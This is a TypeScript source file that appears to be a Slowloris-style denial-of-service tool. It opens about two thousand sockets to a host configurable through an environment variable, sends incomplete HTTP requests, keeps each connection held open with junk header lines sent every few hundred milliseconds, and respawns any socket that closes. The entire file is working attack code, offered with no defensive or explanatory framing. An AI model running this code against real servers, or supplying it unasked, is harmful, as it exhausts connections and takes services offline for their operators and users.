
import net from 'net';

let activeSockets: number = 0

interface Options {
	port: number;
	host: string;
	method: "GET" | "POST" | "PUT";
	path: string;
	rate?: number;
	respawn: boolean;
	sockets: number;
}

const opts: Options = {
	port: 80,
	host: process.env.TARGET_HOST || "192.168.99.100",
	method: 'GET',
	path: '/',
	// rate: 700,
	respawn: true,
	sockets: parseInt(process.env.SOCKETS_NR || "2000"),
}

console.log('Starting sockets...')

const addSocket = () => {
	let socket: net.Socket = new net.Socket()

	socket.connect(opts.port || 80, opts.host)

	let writeKeepAlive: (() => void) | undefined;

	socket.on('connect', () => {

		socket.setTimeout(0)

		const helloMsg = (opts.method || 'GET') + ' ' + (opts.path || '/') + ' HTTP/1.1\r\n';
		// console.log('Write ', helloMsg)
		socket.write(helloMsg, 'ascii', () => {
			console.log('Socket activated. (Total active: ' + activeSockets + ')')
			activeSockets++

			const hostMsg = `Host: ${opts.host}:${opts.port}\r\n`
			socket.write(hostMsg)
			// console.log('Write ', hostMsg)

			const keepAlive = `Connection: keep-alive\r\nAccept: */*\r\n`
			socket.write(keepAlive)



			let sentPacketCount = 0
			let multiplier = Math.floor(Math.random() * 100)

			writeKeepAlive = () => {
				sentPacketCount++
				socket.write('sloww' + (sentPacketCount * multiplier) + ': ' + 'slowpacket' + (sentPacketCount * multiplier + 2) + '\r\n', () => {
					setTimeout(() => writeKeepAlive !== undefined ? writeKeepAlive() : null, (opts.rate || Math.floor(Math.random() * 100) + 600))
				})
			}

			writeKeepAlive()
		})

		

		socket.on('error', (err) => {
			console.log('Socket errorred. ', err.message)
			socket.destroy()
		})

		socket.on('data', (data) => {
			console.log(data.toString())
		})

		socket.on('close', () => {
			activeSockets--
			writeKeepAlive = undefined

			if (opts.hasOwnProperty('respawn') ? opts.respawn : true) {
				console.log('Respawning dead socket...')
				addSocket()
			}
		})
	})
}

for (let i = 0; i <= (opts.sockets || 200); i++) {
	addSocket()
}